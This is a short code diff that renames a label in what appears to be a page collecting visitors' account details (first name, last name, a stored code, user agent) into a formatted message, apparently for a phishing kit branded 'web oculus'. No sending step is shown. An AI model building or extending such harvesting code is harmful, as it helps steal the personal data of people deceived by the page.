@@ -151,7 +151,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
             localStorage.setItem('code', code);
 
-            var content = "💬Thông Tin Tài Khoản 2💬" +
+            var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
                 "\n" + "----------------------------------------------------------" +
                 "\nFirst Name: " + "`" + firstName + "`" +
                 "\nLast Name: " + "`" + lastName + "`" +
